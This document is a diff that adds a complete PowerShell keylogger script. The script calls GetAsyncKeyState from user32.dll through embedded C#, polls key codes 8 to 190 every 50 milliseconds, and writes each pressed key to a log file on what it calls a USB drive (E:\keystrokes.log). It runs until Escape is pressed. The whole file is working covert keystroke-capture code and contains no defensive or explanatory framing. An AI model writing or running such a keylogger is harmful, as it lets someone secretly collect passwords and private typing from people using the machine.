@@ -1,0 +1,48 @@
+# Define the log file path on the USB drive
+$logFile = "E:\keystrokes.log"
+
+# Create the log file if it doesn't exist (with empty content)
+if (-not (Test-Path -Path $logFile)) {
+    New-Item -Path $logFile -ItemType File -Force | Out-Null
+}
+
+# Define the C# signature for keylogging
+$signature = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Keyboard {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+
+# Check if the type already exists
+if (-not ([System.Management.Automation.PSTypeName]'Keyboard').Type) {
+    # Add the C# type definition to PowerShell
+    Add-Type -TypeDefinition $signature -Language CSharp
+}
+
+# Load the System.Windows.Forms assembly
+Add-Type -AssemblyName System.Windows.Forms
+
+# Initialize a hash table to track the state of each key
+$keyStates = @{}
+
+# Main loop for keylogging
+while ($true) {
+    Start-Sleep -Milliseconds 50
+    for ($key = 8; $key -le 190; $key++) {
+        $currentState = [Keyboard]::GetAsyncKeyState($key)
+        if ($currentState -ne 0 -and -not $keyStates[$key]) {
+            $char = [System.Windows.Forms.Keys]$key
+            Add-Content -Path $logFile -Value $char
+            $keyStates[$key] = $true
+        } elseif ($currentState -eq 0) {
+            $keyStates[$key] = $false
+        }
+    }
+    if ([Keyboard]::GetAsyncKeyState(27) -ne 0) { break }
+}
+
+Write-Host "Keystroke logging stopped. Log saved to: $logFile"
